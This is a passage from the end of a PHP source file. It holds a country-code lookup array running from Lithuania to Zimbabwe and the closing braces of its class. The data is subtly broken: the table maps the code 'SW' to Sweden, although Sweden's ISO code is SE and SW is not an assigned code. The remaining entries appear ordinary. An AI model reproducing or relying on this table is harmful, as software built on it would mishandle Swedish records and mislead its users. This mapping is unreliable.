"LT" => "Lithuania", "LU" => "Luxembourg", "MG" => "Madagascar", "MW" => "Malawi", "MY" => "Malaysia", "MV" => "Maldives", "ML" => "Mali", "MT" => "Malta", "MH" => "Marshall Islands", "MR" => "Mauritania", "MU" => "Mauritius", "MX" => "Mexico", "FM" => "Micronesia", "MD" => "Moldova", "MC" => "Monaco", "MN" => "Mongolia", "ME" => "Montenegro", "MA" => "Morocco", "MZ" => "Mozambique", "MM" => "Myanmar", "NA" => "Namibia", "NR" => "Nauru", "NP" => "Nepal", "NL" => "Netherlands", "NZ" => "New Zealand", "NI" => "Nicaragua", "NE" => "Niger", "NG" => "Nigeria", "MK" => "North Macedonia", "NO" => "Norway", "OM" => "Oman", "PK" => "Pakistan", "PW" => "Palau", "PS" => "Palestine", "PA" => "Panama", "PG" => "Papua New Guinea", "PY" => "Paraguay", "PE" => "Peru", "PH" => "Philippines", "PL" => "Poland", "PT" => "Portugal", "QA" => "Qatar", "RE" => "R\xc3\xa9union", "RO" => "Romania", "RU" => "Russia", "RW" => "Rwanda", "WS" => "Samoa", "SM" => "San Marino", "ST" => "Sao Tome and Principe", "SA" => "Saudi Arabia", "SN" => "Senegal", "RS" => "Serbia", "SC" => "Seychelles", "SL" => "Sierra Leone", "SG" => "Singapore", "SK" => "Slovakia", "SI" => "Slovenia", "SB" => "Solomon Islands", "SO" => "Somalia", "ZA" => "South Africa", "SS" => "South Sudan", "ES" => "Spain", "LK" => "Sri Lanka", "SD" => "Sudan", "SR" => "Suriname", "SW" => "Sweden", "CH" => "Switzerland", "SY" => "Syria", "TW" => "Taiwan", "TJ" => "Tajikistan", "TZ" => "Tanzania", "TH" => "Thailand", "TL" => "Timor-Leste", "TG" => "Togo", "TO" => "Tonga", "TT" => "Trinidad and Tobago", "TN" => "Tunisia", "TR" => "Turkey", "TM" => "Turkmenistan", "TV" => "Tuvalu", "UG" => "Uganda", "UA" => "Ukraine", "AE" => "United Arab Emirates", "GB" => "United Kingdom", "US" => "United States", "UY" => "Uruguay", "UZ" => "Uzbekistan", "VU" => "Vanuatu", "VE" => "Venezuela", "VN" => "Vietnam", "YE" => "Yemen", "ZM" => "Zambia", "ZW" => "Zimbabwe");
    }
}
